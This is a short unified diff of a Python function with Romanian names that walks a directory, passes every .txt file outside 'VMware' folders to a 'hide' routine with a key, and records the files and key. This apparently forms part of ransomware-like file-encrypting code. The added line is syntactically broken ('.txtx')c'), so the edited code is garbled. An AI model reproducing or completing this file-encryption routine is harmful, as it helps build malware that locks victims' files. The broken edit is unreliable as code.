@@ -35,7 +35,7 @@ def gaseste(director,cheie):
     fisiere_ascunse=[]
     for currentdir,listofdirs,listoffiles in os.walk(director):
         for fisier in listoffiles:
-            if fisier.endswith('.txt') and 'VMware' not in currentdir:
+            if fisier.endswith('.txtx')c and 'VMware' not in currentdir:
                 ascunde(currentdir+'/'+fisier,cheie)
                 fisiere_ascunse.append({'director':currentdir,'fisier':fisier,'cheie':cheie})
     return fisiere_ascunse
